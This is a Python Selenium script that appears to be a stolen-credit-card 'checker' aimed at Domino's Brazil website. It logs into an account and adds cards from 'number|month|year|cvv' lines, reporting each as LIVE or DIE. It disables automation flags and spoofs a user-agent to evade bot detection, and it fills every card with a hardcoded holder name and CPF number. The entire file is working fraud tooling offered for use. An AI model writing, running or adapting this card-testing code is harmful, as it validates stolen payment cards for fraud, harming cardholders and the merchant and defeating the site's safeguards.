import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

class DominosChecker:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        
    def _get_driver(self):
        """Cria e retorna uma instância do Chrome otimizada para velocidade e concorrência."""
        options = webdriver.ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-extensions')
        options.add_argument('--blink-settings=imagesEnabled=false') # Bloqueia imagens (GANHA MUITA VELOCIDADE)
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--log-level=3')
        options.add_experimental_option('excludeSwitches', ['enable-automation'])
        options.add_experimental_option('useAutomationExtension', False)
        
        # User-Agent para maior compatibilidade
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

        # Caminhos comuns no Railway / Docker / Local
        chromium_paths = [
            '/usr/bin/google-chrome',
            '/usr/bin/chromium-browser',
            '/usr/bin/chromium'
        ]
        for path in chromium_paths:
            if os.path.exists(path):
                options.binary_location = path
                break

        chromedriver_paths = [
            '/usr/bin/chromedriver',
            '/usr/local/bin/chromedriver',
            'chromedriver.exe' # Suporte local windows se presente no path
        ]

        driver = None
        for path in chromedriver_paths:
            try:
                if os.path.exists(path) or path == 'chromedriver.exe':
                    service = Service(path) if os.path.exists(path) else Service()
                    driver = webdriver.Chrome(service=service, options=options)
                    break
            except:
                continue
        
        if not driver:
            # Fallback automático
            try:
                driver = webdriver.Chrome(options=options)
            except Exception as e:
                print(f"[Checker] Erro fatal ao iniciar Chrome: {e}")
                return None
                
        driver.set_page_load_timeout(30)
        return driver

    def test_card(self, linha):
        """Realiza o fluxo completo (login + check) para um único cartão de forma independente."""
        driver = self._get_driver()
        if not driver:
            return "ERROR: Falha ao iniciar navegador"
            
        wait = WebDriverWait(driver, 15)
        
        try:
            # 1. Parsing da linha
            linha = linha.strip()
            partes = linha.split("|")
            if len(partes) != 4:
                return "DIE"
            
            numero, mes, ano, cvv = partes
            data_validade = f"{mes}{ano[-2:]}" if len(ano) == 4 else f"{mes}{ano}"

            # 2. Login
            driver.get("https://www.dominos.com.br/login")
            
            btn_login_senha = wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//*[contains(text(), 'Login com senha')] | //ion-button[contains(., 'Login com senha')]")
            ))
            driver.execute_script("arguments[0].click();", btn_login_senha)

            input_email = wait.until(EC.visibility_of_element_located((By.ID, "ion-input-0")))
            input_email.send_keys(self.email)

            input_senha = wait.until(EC.visibility_of_element_located((By.ID, "ion-input-1")))
            input_senha.send_keys(self.password)

            btn_entrar = wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//*[contains(text(), 'Entrar')] | //ion-button[contains(., 'Entrar')]")
            ))
            driver.execute_script("arguments[0].click();", btn_entrar)
            
            # 3. Navegação e Form de Cartão
            try:
                wait.until(EC.url_contains("my-cards"))
            except:
                driver.get("https://www.dominos.com.br/my-cards")

            btn_add_cartao = wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//*[contains(translate(text(), 'ADICIONAR NOVO CARTÃO', 'adicionar novo cartão'), 'adicionar novo cartão')]")
            ))
            driver.execute_script("arguments[0].click();", btn_add_cartao)

            # Preenchimento reativo
            ion_apelido = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='name']")))
            ActionChains(driver).move_to_element(ion_apelido).click().send_keys("Afonso Claudio").perform()
            
            ion_titular = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='holderName']")))
            ActionChains(driver).move_to_element(ion_titular).click().send_keys("Afonso Claudio").perform()
            
            ion_cpf = wait.until(EC.presence_of_element_located((By.XPATH, "//ion-input[@formcontrolname='cpf']")))
            ActionChains(driver).move_to_element(ion_cpf).click().send_keys("84830336072").perform()

            # Iframes (Cartão, Exp, CVV)
            for i_title, i_id, i_val in [
                ("Iframe para número do cartão", "encryptedCardNumber", numero),
                ("Iframe para data de validade", "encryptedExpiryDate", data_validade),
                ("Iframe para código de segurança", "encryptedSecurityCode", cvv)
            ]:
                try:
                    iframe = wait.until(EC.presence_of_element_located((By.XPATH, f"//iframe[@title='{i_title}']")))
                    driver.switch_to.frame(iframe)
                    input_field = wait.until(EC.presence_of_element_located((By.ID, i_id)))
                    input_field.send_keys(i_val)
                finally:
                    driver.switch_to.default_content()

            # 4. Salvar e Verificar
            btn_salvar = wait.until(EC.element_to_be_clickable(
                (By.XPATH, "//*[translate(text(), 'SALVR', 'salvr')='salvar'] | //ion-button[contains(translate(., 'SALVR', 'salvr'), 'salvar')]")
            ))
            driver.execute_script("arguments[0].click();", btn_salvar)
            
            # Verificação Inteligente (Reativa)
            start_check = time.time()
            while time.time() - start_check < 10:
                try:
                    # Se o formulário desapareceu ou apareceu o Toast de sucesso/Meus Cartões
                    cpf_input = driver.find_elements(By.XPATH, "//input[@placeholder='CPF do titular']")
                    if not cpf_input or not cpf_input[0].is_displayed():
                        return "LIVE"
                    
                    # Se aparecer toast de erro específico (DIE) - opcional expandir aqui
                except:
                    pass
                time.sleep(1)
            
            return "DIE"

        except Exception as e:
            # print(f"[Checker Debug] Erro: {e}")
            return "DIE"
        finally:
            driver.quit()

# Instância global gerenciada pelo main.py
checker_instance = None

